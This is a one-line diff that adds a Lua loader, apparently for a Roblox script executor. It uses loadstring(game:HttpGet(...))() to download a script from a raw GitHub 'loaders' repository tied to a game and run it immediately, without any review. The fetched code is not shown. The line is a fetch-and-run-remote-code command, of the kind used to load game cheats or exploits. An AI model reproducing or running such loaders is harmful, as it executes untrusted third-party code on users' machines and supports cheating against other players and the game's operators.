@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/don-t-get-fired-at-work-spam6-s5wf8etvmbd1gz.lua"))()
